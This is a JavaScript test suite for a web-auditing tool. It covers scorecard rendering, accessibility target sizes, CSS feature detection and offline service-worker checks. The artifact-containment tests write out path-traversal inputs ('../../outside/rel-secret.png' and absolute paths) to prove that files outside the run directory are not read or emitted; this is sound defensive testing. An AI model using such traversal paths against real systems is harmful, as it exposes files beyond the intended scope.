  assert(typeof scored.overall === 'number', 'scorecard: overall should be numeric for the playground report');
  assert(scored.overall > 0 && scored.overall < 100, `scorecard: expected an imperfect overall, got ${scored.overall}`);
  assert(scored.outcomes.length === OUTCOMES.length, 'scorecard: every outcome should be represented');
  for (const o of scored.outcomes) {
    assert(o.score === null || (o.score >= 0 && o.score <= 100), `scorecard: ${o.key} score out of range: ${o.score}`);
  }
  // A clean report scores 100 with no findings.
  const fixed = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  assert(scoreReport(fixed).overall === 100, 'scorecard: a findings-free report should score 100');

  // The rendered page must be self-contained and well-formed enough to open.
  report.__runId = 'r1';
  const html = renderScorecard({
    host: 'example',
    generatedAt: '2026-01-01 00:00',
    runs: [{ runId: 'r1', dir: join(repoRoot, 'examples'), report, compare: null, ...scored }],
    latest: { runId: 'r1', dir: join(repoRoot, 'examples'), report, compare: null, ...scored },
  });
  assert(html.startsWith('<!doctype html>'), 'scorecard: HTML should start with a doctype');
  assert(!html.includes('${'), 'scorecard: HTML contains an unresolved template placeholder');
  assert(!/>\s*undefined\s*</.test(html), 'scorecard: HTML contains a literal undefined');
  // Count dialogs by their generated id rather than by the bare tag name: the
  // inline script is part of this HTML, so prose that mentions a dialog element
  // must not be counted as one (a TODO comment naming tag-and-attribute once
  // unbalanced this very assertion).
  const openDialogs = (html.match(/<dialog\s+id="fd-/g) || []).length;
  const closeDialogs = (html.match(/<\/dialog>/g) || []).length;
  assert(openDialogs === closeDialogs && openDialogs >= report.findings.length, 'scorecard: dialog tags are unbalanced');

  // Finding openers are Invoker Command buttons (commandfor/command="show-modal")
  // with a support-gated imperative fallback, not fake-button list items.
  assert(html.includes('commandfor="fd-'), 'scorecard: openers must carry commandfor dialog ids');
  assert(html.includes('command="show-modal"'), 'scorecard: openers must request show-modal');
  assert(!html.includes('data-open'), 'scorecard: legacy data-open openers must be gone');
  assert(!html.includes('openFor'), 'scorecard: imperative openFor helper must be gone');
  assert(!html.includes('role="button"'), 'scorecard: fake-button roles must be gone (real buttons instead)');
  assert(html.includes("('commandForElement' in HTMLButtonElement.prototype)"), 'scorecard: fallback must be gated on commandForElement support');

  // The history chart's axis labels must not scale below the legibility floor. The CSS
  // rule is always in the page, but the CHART only renders with two or more runs, so the
  // markup assertions run against an explicit two-run render rather than against a page
  // where the chart is absent: an assertion that silently cannot apply is the vacuity
  // this guards against (the single-run fixture here is why the wrapper assertion failed
  // on its first gate run).
  assert(html.includes('.history .axis{fill:var(--muted);font-size:12px}'), 'scorecard: axis labels must use the 12px floor, not the old 10px');
  const chartHtml = renderScorecard({
    host: 'example',
    generatedAt: '2026-01-01 00:00',
    runs: [
      { runId: 'r1', dir: join(repoRoot, 'examples'), report, compare: null, ...scored, overall: 71 },
      { runId: 'r2', dir: join(repoRoot, 'examples'), report, compare: null, ...scored },
    ],
    latest: { runId: 'r2', dir: join(repoRoot, 'examples'), report, compare: null, ...scored },
  });
  assert(chartHtml.includes('class="history-scroll"'), 'scorecard: the chart needs its scroll wrapper');
  assert(chartHtml.includes('style="min-width:640px"'), 'scorecard: the chart must keep its natural width inside the scroll wrapper');
  assert(
    chartHtml.includes('role="region"') && chartHtml.includes('aria-label="Score history trend"') && chartHtml.includes('tabindex="0"'),
    'scorecard: the scroll wrapper must be keyboard focusable and named',
  );

  // Light dismiss is native via closedby="any" on each dialog, with a
  // support-gated imperative fallback for browsers without the attribute.
  assert(html.includes('closedby="any"'), 'scorecard: dialogs must request native light dismiss');
  assert(html.includes("('closedBy' in HTMLDialogElement.prototype)"), 'scorecard: the dismiss fallback must be gated on closedBy support');

  // The sticky topbar is a scroll-state query container and the stuck-state cue
  // lives on its descendant surface (a container query cannot style its own
  // container), so both halves must survive.
  assert(html.includes('container-type:scroll-state') && html.includes('container-name:topbar'), 'scorecard: the topbar must be a named scroll-state container');
  assert(html.includes('@container topbar scroll-state(stuck: top)'), 'scorecard: the stuck-state rule must query the topbar container');
  assert(html.includes('class="topbar-surface"'), 'scorecard: the topbar must keep its queryable surface element');

  // The inline text scorecard leads with the overall + a link, same numbers.
  const text = renderTextScorecard(
    { host: 'example', latest: { runId: 'r1', dir: join(repoRoot, 'examples'), report, ...scored } },
    { htmlPath: 'reports/example/scorecard.html' },
  );
  assert(text.includes(`Overall: ${scored.overall}/100`), 'scorecard text: overall line missing/mismatched');
  assert(text.includes('reports/example/scorecard.html'), 'scorecard text: HTML link missing');
  assert(text.includes('Do these first:'), 'scorecard text: top-3 section missing');

  // CI gate: machine summary + threshold evaluation.
  const data = { host: 'example', generatedAt: 'now', latest: { runId: 'r1', dir: join(repoRoot, 'examples'), report, ...scored } };
  const summary = scorecardSummary(data);
  assert(summary.overall === scored.overall, 'scorecardSummary: overall mismatch');
  assert(summary.findingsTotal === report.findings.length, 'scorecardSummary: findings total mismatch');
  assert(typeof summary.outcomes.discoverable !== 'undefined', 'scorecardSummary: outcomes map missing keys');

  // An impossible bar fails; a trivially-met bar passes.
  const fail = evaluateGates(summary, { min: {}, minOverall: 100, maxCritical: 0 });
  assert(fail.passed === false && fail.checks.some((c) => !c.ok), 'gate: overall=100 should fail an imperfect report');
  const pass = evaluateGates(summary, { min: {}, minOverall: 1, maxHigh: 999 });
  assert(pass.passed === true, 'gate: trivial thresholds should pass');
  // A not-applicable outcome never fails its gate.
  const naGate = evaluateGates({ overall: 50, outcomes: { memory: null }, findingsBySeverity: { critical: 0, high: 0 } }, { min: { memory: 90 } });
  assert(naGate.passed === true, 'gate: a null (N/A) outcome must not fail its gate');
}

// web-uplift-2zj: artifact paths in a report are untrusted input, so resolving one
// outside its run directory must not read the file, and must not be emitted as a
// relative src either. Before the fix, `join(dir, relPath)` collapsed `..` and the
// scorecard read and inlined an arbitrary image into the published HTML.
async function testScorecardArtifactContainment() {
  const { scoreReport, renderScorecard } = await import('../aggregate/scorecard.mjs');
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-artifact-'));
  try {
    const runDir = join(root, 'host', 'r1');
    const prevDir = join(root, 'host', 'r0');
    const outsideDir = join(root, 'outside');
    for (const d of [runDir, prevDir, outsideDir]) mkdirSync(d, { recursive: true });

    // Distinct markers so each assertion names the exact file it is about.
    const relSecret = Buffer.from('TRAVERSAL-REL-MARKER');
    const absSecret = Buffer.from('TRAVERSAL-ABS-MARKER');
    const legitBytes = Buffer.from('LEGIT-INLINE-MARKER');
    writeFileSync(join(outsideDir, 'rel-secret.png'), relSecret);
    writeFileSync(join(outsideDir, 'abs-secret.png'), absSecret);
    writeFileSync(join(outsideDir, 'clip.mp4'), Buffer.from('outside-video'));
    writeFileSync(join(runDir, 'shot.png'), legitBytes);

    // Non-vacuity: the planted file must actually be reachable the way the old
    // unguarded `join(dir, relPath)` resolved it, or the escape assertions below
    // would pass against a fixture that could never have leaked anyway.
    assert(
      existsSync(join(runDir, '../../outside/rel-secret.png')),
      'scorecard: the traversal fixture must be reachable through a plain join, or the escape test is vacuous',
    );

    const report = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));
    report.__runId = 'r1';
    const findingId = report.findings[0].id;
    report.artifacts = [
      { path: 'shot.png', type: 'screenshot', findingIds: [findingId], caption: 'legit' },
      { path: '../../outside/rel-secret.png', type: 'screenshot', findingIds: [findingId], caption: 'escape' },
      { path: join(outsideDir, 'abs-secret.png'), type: 'screenshot', findingIds: [findingId], caption: 'absolute' },
      { path: '../../outside/clip.mp4', type: 'video', findingIds: [findingId], caption: 'escape video' },
    ];
    const scored = scoreReport(report);
    const html = renderScorecard({
      host: 'example',
      generatedAt: '2026-01-01 00:00',
      runs: [{ runId: 'r1', dir: runDir, report, compare: null, ...scored }],
      latest: { runId: 'r1', dir: runDir, report, compare: null, ...scored },
    });

    // The positive control matters as much as the negative ones: a guard that
    // simply stopped inlining would pass every escape assertion below.
    assert(
      html.includes(legitBytes.toString('base64')),
      'scorecard: a contained in-run screenshot must still be inlined',
    );
    assert(
      !html.includes(relSecret.toString('base64')),
      'scorecard: a ../ artifact path must not be read and inlined',
    );
    assert(
      !html.includes(absSecret.toString('base64')),
      'scorecard: an absolute artifact path must not be read and inlined',
    );
    // The base64 check above is NOT sufficient on its own: pre-fix, `join(dir,
    // absPath)` produced a nonexistent path, so the file was never inlined and
    // the assertion passed anyway - the leak was the emitted relative URL. Assert
    // on the filename so this fails against the pre-fix code.
    assert(
      !html.includes('abs-secret.png'),
      'scorecard: an absolute artifact path must not be emitted into the HTML at all',
    );
    assert(
      !html.includes('../../outside'),
      'scorecard: an escaping artifact path must not be emitted as a relative src',
    );

    // The compare panel resolves before/after paths against OTHER run directories
    // and goes through the same read, so it needs the same containment guard.
    const cmp = {
      runA: 'r0',
      runB: 'r1',
      summary: {},
      metrics: [],
      screenshotPairs: [{ before: '../../outside/rel-secret.png', after: 'shot.png', caption: 'pair' }],
    };
    const cmpHtml = renderScorecard({
      host: 'example',
      generatedAt: '2026-01-01 00:00',
      runs: [
        { runId: 'r0', dir: prevDir, report, compare: null, ...scored },
        { runId: 'r1', dir: runDir, report, compare: cmp, ...scored },
      ],
      latest: { runId: 'r1', dir: runDir, report, compare: cmp, ...scored },
    });
    assert(
      cmpHtml.includes(legitBytes.toString('base64')),
      'scorecard: the compare panel must still inline a contained after-shot',
    );
    assert(
      !cmpHtml.includes(relSecret.toString('base64')),
      'scorecard: a ../ before/after compare path must not be read and inlined',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// web-uplift-2zj (reviewer finding): aggregate/compare.mjs had the same
// uncontained-artifact shape as the scorecard - `resolveArtifact` fell back to a
// bare `join(dir, p)`, and it ALSO passed absolute paths straight through, so a
// report-supplied HAR path could be read from anywhere on disk. compare.md also
// emitted before/after paths verbatim.
async function testCompareArtifactContainment() {
  const { compareReports, renderCompareMd } = await import('../aggregate/compare.mjs');
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-compare-'));
  try {
    const dirA = join(root, 'host', 'r0');
    const dirB = join(root, 'host', 'r1');
    const outsideDir = join(root, 'outside');
    for (const d of [dirA, dirB, outsideDir]) mkdirSync(d, { recursive: true });

    // Same 2-entry HAR inside and outside, so "was it read?" is answered by the
    // entry count alone: 2 means it was read, null means the guard refused.
    const har = { log: { entries: [{ response: { _transferSize: 100 } }, { response: { _transferSize: 200 } }] } };
    writeFileSync(join(outsideDir, 'rel-secret.har'), JSON.stringify(har));
    // diffNetwork reads the A side against dirA and the B side against dirB, so
  // the contained control has to exist in BOTH run dirs.
  writeFileSync(join(dirA, 'run.har'), JSON.stringify(har));
  writeFileSync(join(dirB, 'run.har'), JSON.stringify(har));
    writeFileSync(join(outsideDir, 'rel-secret.png'), Buffer.from('COMPARE-TRAVERSAL-MARKER'));
    writeFileSync(join(dirA, 'shot.png'), Buffer.from('COMPARE-LEGIT-MARKER'));

    const base = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));
    const withArtifact = (path) => {
      const r = structuredClone(base);
      r.artifacts = [{ type: 'har', path }];
      return r;
    };
    const contained = withArtifact('run.har');
    const escaping = withArtifact('../../outside/rel-secret.har');
    const absolute = withArtifact(join(outsideDir, 'rel-secret.har'));

    // If either HAR had been read, its count would be 2. `null` on the unsafe
    // side and 2 on the contained side is the containment proof AND the positive
    // control in one assertion.
    const blocked = compareReports(escaping, contained, { dirA, dirB });
    assert(
      blocked.network?.requestCount.before === null && blocked.network?.requestCount.after === 2,
      `compare: an escaping HAR path must not be read while a contained one is (got ${JSON.stringify(blocked.network)})`,
    );
    const blockedAbs = compareReports(absolute, contained, { dirA, dirB });
    assert(
      blockedAbs.network?.requestCount.before === null,
      `compare: an absolute HAR path must not be read (got ${JSON.stringify(blockedAbs.network)})`,
    );

    // compare.md must not emit an escaping or absolute image reference.
    const cmp = {
      ...compareReports(base, base, { dirA, dirB }),
      screenshotPairs: [
        { before: '../../outside/rel-secret.png', after: join(outsideDir, 'rel-secret.png'), caption: 'escape' },
        { before: 'shot.png', after: 'shot.png', caption: 'legit' },
      ],
    };
    const md = renderCompareMd(cmp, { hostName: 'example.test', runAId: 'r0', runBId: 'r1', dirA, dirB });
    assert(!md.includes('../../outside'), 'compare.md: an escaping before/after path must not be emitted');
    assert(!md.includes(outsideDir), 'compare.md: an absolute before/after path must not be emitted');
    // Positive control: a contained path is still rendered (rewritten relative to
    // runB's dir, which is why the legitimate reference itself starts with ../).
    assert(md.includes('![before](../r0/shot.png)'), `compare.md: a contained before path must still be emitted:\n${md}`);
    assert(md.includes('![after](shot.png)'), 'compare.md: a contained after path must still be emitted');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

async function testDiscoverabilityHelpers() {
  const { stripHtmlToText, contentTokens, detectEmptyMounts, contentPresentInRaw } = await import('../evidence/cli.mjs');

  // stripHtmlToText drops scripts/styles/markup, keeps visible text.
  const text = stripHtmlToText('<html><head><style>.x{color:red}</style></head><body><h1>Hello There</h1><script>var a=1</script><p>Body &amp; content</p></body></html>');
  assert(text.includes('Hello There') && text.includes('Body & content'), `stripHtmlToText missed content: ${text}`);
  assert(!text.includes('color:red') && !text.includes('var a'), `stripHtmlToText leaked script/style: ${text}`);

  // contentTokens keeps >=4-char words, lowercased, de-duped.
  const toks = contentTokens('The Thylakoid MEMBRANE membrane a to');
  assert(toks.has('thylakoid') && toks.has('membrane'), 'contentTokens missing expected words');
  assert(!toks.has('the') && !toks.has('to'), 'contentTokens should skip short words');
  assert(toks.size === 2, `contentTokens should de-dupe case-insensitively, got ${toks.size}`);

  // detectEmptyMounts flags an empty SPA root but not a filled one.
  assert(detectEmptyMounts('<div id="root"></div>').includes('#root'), 'should detect empty #root');
  assert(detectEmptyMounts('<div id="root"><h1>hi</h1></div>').length === 0, 'should not flag a filled #root');
  assert(detectEmptyMounts('<div id="__next">   </div>').includes('#__next'), 'should detect empty #__next');

  // contentPresentInRaw: inline markup and line breaks must not hide a
  // server-rendered h1/title (web-uplift-406). innerText collapses them, so the
  // verbatim-substring compare reported the h1 of paul.kinlan.me as missing.
  const rawFixture = stripHtmlToText('<html><head><title>Hello. I am Paul Kinlan.</title></head><body><h1 class="x">\n          Hello. I am <span class="fn">Paul Kinlan</span>.\n        </h1></body></html>');
  assert(contentPresentInRaw('Hello. I am Paul Kinlan.', rawFixture), `inline-span h1 should be present in raw text: ${rawFixture}`);
  assert(contentPresentInRaw('Hello. I am\n          Paul Kinlan.', rawFixture), 'a rendered value with line breaks should still match');
  assert(!contentPresentInRaw('Client Injected Heading', rawFixture), 'a JS-only heading must not read as present');
  assert(!contentPresentInRaw('', rawFixture) && !contentPresentInRaw(null, rawFixture), 'empty values are not present');
  // A value with no >=4-char tokens still compares, so it is not present by default.
  assert(contentPresentInRaw('Hi', '<p>Hi there</p>'), 'short text should be found when present');
  assert(!contentPresentInRaw('Hi', '<p>Bye there</p>'), 'short text should not be found when absent');
}

// End to end, through the real primitive: a server-rendered h1 broken up by an
// inline span and line breaks must report h1PresentInRaw true (the paul.kinlan.me
// shape, web-uplift-406), and an h1 that only JavaScript inserts must stay false,
// so the fix cannot be paid for by weakening the shell detection.
async function testDiscoverabilityH1InRaw() {
  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    if ((req.url || '').startsWith('/markup')) {
      res.end('<!doctype html><html><head><title>Inline markup</title></head><body>' +
        '<h1 class="page-title">\n          Hello. I am <span class="fn">Paul Kinlan</span>.\n        </h1>' +
        '<p>A server-rendered paragraph with enough words for the coverage measure to compare.</p>' +
        '</body></html>');
      return;
    }
    res.end('<!doctype html><html><head><title>Client rendered</title></head><body>' +
      '<div id="app"></div>' +
      '<p>A server-rendered paragraph with enough words for the coverage measure to compare.</p>' +
      '<script>document.querySelector("#app").innerHTML = "<h1>Client Injected Heading</h1>";</script>' +
      '</body></html>');
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;

    const markup = await gather('discoverability', `${base}/markup`, { quiet: true, wait: 0, screenshots: false });
    assert(markup.rendered.h1Count === 1, `discoverability: expected the rendered h1: ${JSON.stringify(markup.rendered)}`);
    assert(
      markup.h1PresentInRaw === true,
      `discoverability: an inline-span h1 was reported missing from the raw HTML: ${JSON.stringify(markup.rendered)}`,
    );

    const injected = await gather('discoverability', `${base}/client`, { quiet: true, wait: 0, screenshots: false });
    assert(injected.rendered.h1Count === 1, `discoverability: expected the JS-injected h1: ${JSON.stringify(injected.rendered)}`);
    assert(
      injected.h1PresentInRaw === false,
      `discoverability: a JS-injected h1 read as present in the raw HTML: ${JSON.stringify(injected.rendered)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// WCAG 2.2 SC 2.5.8 Target Size (Minimum) needs real geometry: the targets
// primitive enumerates pointer targets, flags anything under 24x24 CSS px, marks
// the inline-in-text and spacing exceptions it can read from geometry, and
// measures a desktop and a narrow layout by default (web-uplift-uz7).
async function testTargetsPrimitive() {
  const page = [
    '<!doctype html><html><head><title>targets</title><style>',
    '  body { margin: 0; }',
    '  .tiny { width: 16px; height: 16px; padding: 0; border: 0; }',
    '  .big { width: 48px; height: 48px; }',
    '  .gap { margin-left: 200px; }',
    '  section, p { margin-bottom: 40px; }',
    '  p { font-size: 16px; line-height: 20px; }',
    '</style></head><body>',
    '<p>Read the <a class="tiny" href="#a" id="inline-link">text</a> in this sentence.</p>',
    '<section><button class="tiny" id="tight-a">a</button><button class="tiny" id="tight-b">b</button></section>',
    '<section><button class="tiny" id="spaced-a">a</button><button class="tiny gap" id="spaced-b">b</button></section>',
    '<section><button class="big" id="big-button">ok</button></section>',
    '<section><span style="display:none">hidden</span><a href="#z" style="width:0;height:0"></a></section>',
    '</body></html>',
  ].join('\n');
  const many = '<!doctype html><html><head><title>many</title><style>a{display:inline-block;width:8px;height:8px}</style></head><body>' +
    Array.from({ length: 420 }, (_, i) => `<a href="#${i}">${i}</a>`).join('') +
    '</body></html>';
  const empty = '<!doctype html><html><head><title>empty</title></head><body><p>No pointer targets at all here.</p></body></html>';

  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/favicon.ico') {
      res.writeHead(204);
      res.end();
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    if (path === '/many') res.end(many);
    else if (path === '/empty') res.end(empty);
    else res.end(page);
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;

    const result = await gather('targets', `${base}/page`, { quiet: true, wait: 250 });
    assert(result.minimumPx === 24, `targets: minimum should be 24 CSS px: ${result.minimumPx}`);
    assert(result.viewports.length === 2, `targets: expected a desktop and a narrow pass by default: ${result.viewports.length}`);
    const [desktop, narrow] = result.viewports;
    assert(
      desktop.name === 'desktop-1280x720' && desktop.viewport.width === 1280 && desktop.viewport.height === 720,
      `targets: the desktop pass did not measure a 1280x720 layout: ${JSON.stringify(desktop.viewport)}`,
    );
    assert(
      narrow.name === 'narrow-360x800' && narrow.viewport.width === 360 && narrow.viewport.height === 800,
      `targets: the narrow pass did not measure a 360x800 layout: ${JSON.stringify(narrow.viewport)}`,
    );

    const byId = new Map(desktop.targets.map((t) => [t.id, t]));
    const inline = byId.get('inline-link');
    assert(
      inline?.underMin === true && inline.inlineInText === true,
      `targets: an undersized link in a sentence should be flagged and marked inline-exempt: ${JSON.stringify(inline)}`,
    );
    for (const id of ['tight-a', 'tight-b']) {
      const t = byId.get(id);
      assert(
        t?.underMin === true && t.inlineInText === false && t.spacingPasses === false,
        `targets: ${id} is undersized with no spacing clearance and should say so: ${JSON.stringify(t)}`,
      );
    }
    for (const id of ['spaced-a', 'spaced-b']) {
      const t = byId.get(id);
      assert(
        t?.underMin === true && t.spacingPasses === true,
        `targets: ${id} is undersized but clears its neighbours and should say so: ${JSON.stringify(t)}`,
      );
    }
    const big = byId.get('big-button');
    assert(
      big?.underMin === false && big.spacingPasses === null,
      `targets: a 48x48 button is not undersized: ${JSON.stringify(big)}`,
    );
    assert(desktop.skippedZeroSizeCount === 1, `targets: the zero-size target should be skipped: ${desktop.skippedZeroSizeCount}`);
    assert(
      desktop.underMinCount === 5 &&
        desktop.underMinInlineExemptCount === 1 &&
        desktop.underMinSpacingExemptCount === 3 &&
        desktop.underMinNoKnownExemptionCount === 2,
      `targets: summary counts do not match the inventory: ${JSON.stringify({ underMin: desktop.underMinCount, inline: desktop.underMinInlineExemptCount, spacing: desktop.underMinSpacingExemptCount, none: desktop.underMinNoKnownExemptionCount })}`,
    );
    assert(
      narrow.underMinNoKnownExemptionCount === 2,
      `targets: the narrow pass should reach the same verdict on this fixture: ${narrow.underMinNoKnownExemptionCount}`,
    );

    // An explicit --viewport means one pass, and the inventory is capped with the
    // cap reported rather than silently trimmed.
    const manyResult = await gather('targets', `${base}/many`, { quiet: true, wait: 200, viewport: { w: 360, h: 800 } });
    assert(manyResult.viewports.length === 1, `targets: an explicit viewport should give one pass: ${manyResult.viewports.length}`);
    const capped = manyResult.viewports[0];
    assert(
      capped.matchedCount === 420 && capped.measuredCount === 400 && capped.omittedByCapCount === 20,
      `targets: the target cap was not reported: ${JSON.stringify({ matched: capped.matchedCount, measured: capped.measuredCount, omitted: capped.omittedByCapCount })}`,
    );
    assert(
      capped.underMinCount === 400 && capped.underMinNoKnownExemptionCount === 400,
      `targets: a wall of adjacent 8x8 links has no read exemption: ${JSON.stringify({ underMin: capped.underMinCount, noExemption: capped.underMinNoKnownExemptionCount })}`,
    );

    // No targets is a clean zero result, not an absent field: that is the
    // evidence a no-target page needs for the check to pass.
    const emptyResult = await gather('targets', `${base}/empty`, { quiet: true, wait: 200, viewport: { w: 360, h: 800 } });
    const none = emptyResult.viewports[0];
    assert(
      none.measuredCount === 0 && none.underMinNoKnownExemptionCount === 0 && none.targets.length === 0,
      `targets: a page with no targets should report zeroes: ${JSON.stringify({ measured: none.measuredCount, noExemption: none.underMinNoKnownExemptionCount })}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// The checks that turn on which modern CSS a page actually ships need the LIVE
// CSSOM, not a grep of the dom primitive's capped css string. This fixture
// covers every census source (document sheet with @import/@layer/@container/
// @starting-style/@scope/@supports/@property, a cross-origin sheet that must be
// skipped rather than crash the walk, a shadow-root adopted sheet, inline
// styles), the tracked feature rows, the overlay census, and the condition cap
// (web-uplift-xci).
async function testFeaturesPrimitive() {
  // The cross-origin sheet has to be a different origin, and a different port
  // is a different origin, so a second server is the cheapest honest fixture.
  const cross = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/css' });
    res.end('.cross { color: orange; }');
  });
  await new Promise((resolveListen) => cross.listen(0, '127.0.0.1', resolveListen));
  const crossPort = cross.address().port;

  const css = [
    '@layer base, theme;',
    '@layer base { .a { color: light-dark(#111, #eee); } }',
    '@media (prefers-color-scheme: dark) { .a { color-scheme: dark; } }',
    '@container card (min-width: 300px) { .b { color: red; } }',
    '@starting-style { .c { opacity: 0; } }',
    '@scope (.scope-root) { .d { color: blue; } }',
    '@supports (color: light-dark(black, white)) { .e { color: light-dark(black, white); } }',
    '.f { container-type: inline-size; container-name: card; anchor-name: --a; position-try: --t; text-wrap: balance; }',
    '.g:has(> .h) { color: green; }',
    'dialog::backdrop { background: rgb(0 0 0 / 0.5); }',
    '.pop:popover-open { color: purple; }',
    '@keyframes fade { from { opacity: 0; } to { opacity: 1; } }',
    "@property --my-prop { syntax: '<length>'; inherits: false; initial-value: 0px; }",
    ':root { --brand: #123; --space: 4px; }',
  ].join('\n');
  const manyConditions = Array.from({ length: 70 }, (_, i) => `@media (min-width: ${100 + i}px) { .m${i} { color: red; } }`).join('\n');

  const page = (many) => [
    '<!doctype html><html><head><title>features</title>',
    ...(many ? [] : [`<link rel="stylesheet" href="http://127.0.0.1:${crossPort}/cross.css">`]),
    '<style>',
    "@import url('/imported.css');",
    many ? manyConditions : css,
    '</style></head><body>',
    '<div class="scope-root"><p class="d">scoped</p></div>',
    '<dialog open>native dialog</dialog>',
    '<div popover id="pop">popover</div>',
    '<details><summary>more</summary>body</details>',
    '<div role="dialog" aria-modal="true">div dialog</div>',
    '<div id="stack" style="position:fixed;z-index:60">stacked</div>',
    '<div id="inline" style="container-type:inline-size">inline container</div>',
    '<div id="host"></div>',
    '<script>',
    "  const root = document.getElementById('host').attachShadow({ mode: 'open' });",
    '  const sheet = new CSSStyleSheet();',
    "  sheet.replaceSync('.shadowed { interpolate-size: allow-keywords; }');",
    '  root.adoptedStyleSheets = [sheet];',
    "  root.innerHTML = '<span class=\"shadowed\">shadow</span>';",
    '</script>',
    '</body></html>',
  ].join('\n');

  const main = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/imported.css') {
      res.writeHead(200, { 'Content-Type': 'text/css' });
      res.end('.imported { animation-timeline: --t; }');
      return;
    }
    if (path === '/favicon.ico') {
      res.writeHead(204);
      res.end();
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(page(path === '/many'));
  });

  await new Promise((resolveListen) => main.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = main.address();
    const base = `http://127.0.0.1:${port}`;

    const result = await gather('features', `${base}/`, { quiet: true, wait: 600 });

    // Every style source is visited, and the unreadable one is counted, named,
    // and makes the census explicitly partial rather than silently thin.
    assert(result.censusComplete === false, `features: a cross-origin sheet must make the census incomplete: ${result.censusComplete}`);
    assert(result.sheets.crossOriginSkipped === 1, `features: the cross-origin sheet should be skipped and counted: ${JSON.stringify(result.sheets)}`);
    assert(
      result.sheets.crossOriginSheetUrls.some((u) => u.includes('/cross.css')),
      `features: the skipped sheet should be named so it can be checked another way: ${JSON.stringify(result.sheets.crossOriginSheetUrls)}`,
    );
    assert(result.sheets.importedSheetsFollowed === 1, `features: the @import sheet should be followed: ${JSON.stringify(result.sheets)}`);
    assert(result.sheets.shadowRootsScanned === 1, `features: the shadow root should be scanned: ${JSON.stringify(result.sheets)}`);
    assert(result.sheets.inlineStyleElements === 2, `features: both inline styles should be scanned: ${JSON.stringify(result.sheets)}`);

    const atRules = result.tracked.atRules;
    assert(
      atRules['@container'] === 1 && atRules['@starting-style'] === 1 && atRules['@scope'] === 1 &&
        atRules['@supports'] === 1 && atRules['@property'] === 1 && atRules['@layer'] === 2 && atRules['@view-transition'] === 0,
      `features: at-rule census is wrong: ${JSON.stringify(atRules)}`,
    );
    const props = result.tracked.properties;
    assert(
      props['container-type'] >= 2 && props['anchor-name'] === 1 && props['position-try-fallbacks'] === 1 &&
        props['animation-timeline'] === 1 && props['interpolate-size'] === 1 && props['color-scheme'] === 1 &&
        props['content-visibility'] === 0,
      `features: property census is wrong: ${JSON.stringify(props)}`,
    );
    assert(result.tracked.functions['light-dark'] >= 2, `features: light-dark() usage was not counted: ${JSON.stringify(result.tracked.functions)}`);
    const sels = result.tracked.selectors;
    assert(
      sels[':has('] === 1 && sels['::backdrop'] === 1 && sels[':popover-open'] === 1 && sels[':is('] === 0,
      `features: selector census is wrong: ${JSON.stringify(sels)}`,
    );
    assert(result.customProperties.distinct === 2, `features: custom properties were not counted: ${JSON.stringify(result.customProperties)}`);
    const conditionNames = Object.keys(result.conditions);
    assert(
      conditionNames.includes('@media (prefers-color-scheme: dark)') && conditionNames.some((c) => c.startsWith('@container card')),
      `features: conditional at-rule preludes should be in the census: ${JSON.stringify(conditionNames)}`,
    );

    const overlays = result.overlays;
    assert(
      overlays.dialogElements === 1 && overlays.openDialogs === 1 && overlays.popoverElements === 1 &&
        overlays.detailsElements === 1 && overlays.roleDialogElements === 1 && overlays.ariaModalElements === 1,
      `features: overlay census is wrong: ${JSON.stringify(overlays)}`,
    );
    assert(
      overlays.highZIndexCount === 1 && overlays.highZIndexMax === 60 && overlays.highZIndexExamples[0]?.id === 'stack',
      `features: the high z-index div was not surfaced: ${JSON.stringify(overlays)}`,
    );

    // The condition map is capped, and the cap is reported rather than silent.
    // This page has no cross-origin sheet, so it also proves the complete case.
    const capped = await gather('features', `${base}/many`, { quiet: true, wait: 500 });
    assert(capped.censusComplete === true, `features: a same-origin-only page should report a complete census: ${JSON.stringify(capped.sheets)}`);
    assert(
      capped.conditionsTotal === 70 && capped.conditionsTruncated === true && Object.keys(capped.conditions).length === 60,
      `features: the condition cap was not reported: ${JSON.stringify({ total: capped.conditionsTotal, shown: Object.keys(capped.conditions).length, truncated: capped.conditionsTruncated })}`,
    );
  } finally {
    await new Promise((resolveClose) => main.close(resolveClose));
    await new Promise((resolveClose) => cross.close(resolveClose));
  }
}

// be-resilient/offline-and-installable had no evidence path: the model could
// read the manifest and nothing else. This drives the real behaviour - install a
// service worker online, then go genuinely offline and reload: once for a
// precached URL (the cached page renders), once for an uncached one in scope
// (the offline fallback renders), and once on a page with nothing resilient at
// all (the navigation fails with a net error). It also checks that CDP's worker
// list is attributed per origin, because the domain also reports the browser's
// own extension workers (web-uplift-7v3).
async function testResiliencePrimitive() {
  const swJs = [
    "const CACHE = 'fixture-v1';",
    "self.addEventListener('install', (e) => { e.waitUntil(caches.open(CACHE).then((c) => c.addAll(['/', '/offline.html']))); });",
    "self.addEventListener('activate', (e) => { e.waitUntil(self.clients.claim()); });",
    'self.addEventListener(\'fetch\', (e) => {',
    // Navigations use the app-shell fallback (no network), so the fallback path
    // is deterministic offline; other requests go cache-first then network.
    "  if (e.request.mode === 'navigate') {",
    "    e.respondWith(caches.match(e.request).then((hit) => hit || caches.match('/offline.html')));",
    '    return;',
    '  }',
    "  e.respondWith(caches.match(e.request).then((hit) => hit || fetch(e.request)));",
    '});',
  ].join('\n');
  const manifest = JSON.stringify({
